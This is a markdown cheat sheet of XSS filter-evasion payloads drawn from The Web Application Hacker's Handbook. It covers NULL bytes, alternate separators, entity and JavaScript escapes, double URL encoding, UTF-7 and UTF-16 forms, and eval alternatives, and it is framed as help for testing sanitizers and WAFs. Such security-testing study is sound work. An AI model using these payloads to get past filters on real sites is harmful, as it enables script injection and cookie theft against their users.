# Filter Evasion

## What it is

These examples collect the obfuscation and filter-bypass material from the original mixed examples page.

## When it applies

Use these when you need to test how sanitizers, WAFs, encoders, or case mangling handle XSS payloads.

## Example

### NULL bytes in tag names

```html
<[%00]img onerror=alert(1) src=a>
<i[%00]mg onerror=alert(1) src=a>
```

Using NULL bytes has historically proven effective against web application firewalls (WAFs) configured to block requests containing known attack strings. Because WAFs typically are written in native code for performance reasons, a NULL byte terminates the string in which it appears. This prevents the WAF from seeing the malicious payload that comes after the NULL.

### Alternative separators between a tag and its first attribute

```html
<img/onerror=alert(1) src=a>
<img[%09]onerror=alert(1) src=a>
<img[%0d]onerror=alert(1) src=a>
<img[%0a]onerror=alert(1) src=a>
<img/"onerror=alert(1) src=a>
<img/'onerror=alert(1) src=a>
<img/anyjunk/onerror=alert(1) src=a>
<script/anyjunk>alert(1)</script>
```

### Breaking attribute-name filters

```html
<img o[%00]nerror=alert(1) src=a>
```

### HTML encoding within a payload

```html
<img onerror=a[%00]lert(1) src=a>
<img onerror=a&#x6c;ert(1) src=a>
<img onerror=a&#x06c;ert(1) src=a>
<img onerror=a&#x006c;ert(1) src=a>
<img onerror=a&#x0006c;ert(1) src=a>
<img onerror=a&#108;ert(1) src=a>
<img onerror=a&#0108;ert(1) src=a>
<img onerror=a&#108ert(1) src=a>
<img onerror=a&#0108ert(1) src=a>
```

### Double decoding

```text
%253cimg%20onerror=alert(1)%20src=a%253e
```

This is URL-decoded by the application server and passed to the application as:

```text
%3cimg onerror=alert(1) src=a%3e
```

The application decodes as:

```html
<img onerror=alert(1) src=a>
```

### Unbalanced and nested tags

```html
<<script>alert(1);//<</script>
<script><script>alert(1)</script>
<scr<script>ipt>alert(1)</script>
```

### Character set encoding

Representations of the string `<script>alert(document.cookie)</script>` in alternative character sets:

```text
UTF-7
+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-

US-ASCII
BC 73 63 72 69 70 74 BE 61 6C 65 72 74 28 64 6F ; ¼script¾alert(do
63 75 6D 65 6E 74 2E 63 6F 6F 6B 69 65 29 BC 2F ; cument.cookie)¼/
73 63 72 69 70 74 BE                            ; script¾

UTF-16
FF FE 3C 00 73 00 63 00 72 00 69 00 70 00 74 00 ; <.s.c.r.i.p.t.
3E 00 61 00 6C 00 65 00 72 00 74 00 28 00 64 00 ; >.a.l.e.r.t.(.d.
6F 00 63 00 75 00 6D 00 65 00 6E 00 74 00 2E 00 ; o.c.u.m.e.n.t...
63 00 6F 00 6F 00 6B 00 69 00 65 00 29 00 3C 00 ; c.o.o.k.i.e.).<.
2F 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00 ; /.s.c.r.i.p.t.>.
```

### JavaScript escapes and dynamic construction

```html
<script>a\u006cert(1);</script>
<script>eval('a\u006cert(1)');</script>
<script>eval('a\x6cert(1)');</script>
<script>eval('a\154ert(1)');</script>
<script>eval('a\l\ert\(1\)');</script>
<script>eval('al'+'ert(1)');</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
<script>eval(atob('amF2YXNjcmlwdDphbGVydCgxKQ'));</script>
```

### Alternatives to `eval` and to dots

```html
<script>'alert(1)'.replace(/.+/,eval)</script>
<script>function::['alert'](1)</script>
<script>alert(document['cookie'])</script>
<script>with(document)alert(cookie)</script>
```

### Encoded Unicode escape inside an event handler

```html
<img onerror=eval('al&#x5c;u0065rt(1)') src=a>
<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>
```

## Notes

The original notes repeatedly returned to the same theme: if the obvious form of a payload is blocked, try alternative encodings, separators, or execution primitives before assuming the sink is safe.

## Source

Stuttard, Dafydd. *The Web Application Hacker's Handbook* (Kindle Locations 12261-12275, 12296-12310, 12336-12338, 12348-12350, 12364, 12380, 12400-12409, 12449-12499, 12568-12575). Wiley. Kindle Edition.
